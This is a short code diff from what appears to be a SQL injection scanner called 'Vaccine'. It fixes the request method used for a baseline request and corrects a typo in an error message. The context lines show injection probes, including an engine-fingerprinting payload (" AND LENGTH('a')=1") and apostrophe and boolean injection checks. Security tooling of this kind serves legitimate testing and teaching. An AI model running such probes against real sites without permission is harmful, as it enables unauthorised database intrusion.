@@ -12,7 +12,7 @@ def get_engine(url, value, name, params, method):
         copy_mysql[name] = value + " AND LENGTH('a')=1"
         is_mssql = send(url, copy,method)
         is_mysql = send(url, copy_mysql, method)
-        r = send(url, params, "GET")
+        r = send(url, params, method)
         if(is_mssql.status_code == 200 and ecart(len(is_mssql.text), len(r.text)) < 10 ) :
             return ENGINES["mssql"]
         elif(is_mysql.status_code == 200 and ecart(len(is_mysql.text), len(r.text)) < 10 ) :
@@ -29,7 +29,7 @@ def inject_apostrophe(name,value, params, parsed_url, method):
     if((r.status_code == 200 and copy_r.status_code == 500) or (ecart(len(r.text), len(copy_r.text)) > 30)):
         engine = get_engine(parsed_url, value, name, params, method)
         if engine == None:
-            print("databs etype not supported by Vaccine")
+            print("database type not supported by Vaccine")
             return
         Ctx = namedtuple("Ctx", ["url", "params", "name", "method", "len"])
         ctx = Ctx(parsed_url, params, name, method, len(r.text))
@@ -54,7 +54,7 @@ def inject_bool(name,value, params, parsed_url, method):
     if((ecart(len(r_copy.text), len(r.text)) < 10 and ecart(len(fail_r.text), len(r_copy.text)) > 30) or (r_copy.status_code == 200 and fail_r.status_code==500)):
         engine = get_engine(parsed_url, value, name, params, method)
         if engine == None:
-            print("databs etype not supported by Vaccine")
+            print("database type not supported by Vaccine")
             return
         Ctx = namedtuple("Ctx", ["url", "params", "name", "method", "len"])
         ctx = Ctx(parsed_url, params, name, method, len(r.text))
